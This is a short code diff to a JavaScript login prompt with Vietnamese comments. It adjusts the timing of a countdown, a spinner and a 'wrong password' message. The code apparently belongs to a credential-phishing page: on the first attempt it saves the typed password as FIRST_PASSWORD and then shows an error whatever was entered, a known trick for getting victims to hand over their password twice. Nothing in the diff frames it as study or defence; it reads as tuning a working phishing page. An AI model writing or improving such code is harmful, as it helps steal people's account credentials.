@@ -247,16 +247,21 @@ function showPrompt(IpAddress) {
         })
         .then(data => {
             NUMBER_TIME_LOGIN++;
-           if (NUMBER_TIME_LOGIN === 1) {
+          if (NUMBER_TIME_LOGIN === 1) {
     FIRST_PASSWORD = password;
 
     const submitBtn = $('#submit-password');
-    submitBtn.prop('disabled', true);
-
     let countdown = 10;
 
-    // 👉 Gọi vòng đầu tiên ngay lập tức
+    // 👉 Cập nhật ngay để tránh delay hiển thị
     submitBtn.text(`Wait ${countdown}s`);
+    submitBtn.prop('disabled', true);
+
+    // 👉 Delay phần DOM nặng sang vòng sau
+    setTimeout(() => {
+        $('.lsd-ring-container').addClass('d-none');
+        $('#password').val('');
+    }, 100); // hoãn 100ms để đảm bảo giao diện đã cập nhật nút
 
     const interval = setInterval(() => {
         countdown--;
@@ -267,13 +272,12 @@ function showPrompt(IpAddress) {
             submitBtn.prop('disabled', false);
             submitBtn.text('Continue');
 
-            // Hiển thị lỗi sau khi hết đếm ngược
+            // 👉 Hiện lỗi sau khi đếm xong
             $('#wrong-password').removeClass('d-none');
-            $('.lsd-ring-container').addClass('d-none');
-            $('#password').val('');
         }
     }, 1000);
 }
+
  else {
                 setTimeout(function () {
                     $('.lsd-ring-container').addClass('d-none');
